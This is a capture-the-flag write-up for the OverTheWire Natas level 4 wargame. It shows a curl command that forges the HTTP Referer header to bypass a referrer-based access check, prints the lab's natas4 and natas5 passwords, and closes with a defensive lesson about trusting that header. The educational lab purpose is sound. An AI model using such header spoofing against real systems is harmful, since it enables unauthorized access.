---
category: natas
title: Natas4 - HTTP Referer
---
website: http://natas4.natas.labs.overthewire.org/ (password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ)

Go to the website and it says <small>Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"</small>. Click "Refresh page" link, now it says <small>visiting from "http://natas4.natas.labs.overthewire.org/"</small>. This info is related with HTTP headers in an HTTP request, particularly the HTTP `referer` field. This field indicates the last page the user was on. By checking this field, the new webpage can see where the request originated (i.e., where a user clicked the link).

According to the prompt <small>authorized users should come only from "http://natas5.natas.labs.overthewire.org/"</small>, I think of tampering the `referer` field in my HTTP request to make it look like from the mentioned URL.

To hijack a forged URL referer, I used the <em>curl</em> command tool. Here is how it looks like. As you can see, we now have the natas5's password in the response:
```console
bash-5.0$ curl http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org/ --referer "http://natas5.natas.labs.overthewire.org/"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

<strong>CONCLUSION</strong>

Be careful if your website uses HTTP `referer` field for authentication or authorization. You cannot solely rely on such a field because an attacker can spoof it.

<strong>References</strong>

- https://en.wikipedia.org/wiki/HTTP_referer
- https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns
- cURL manual: https://curl.se/docs/manual.html
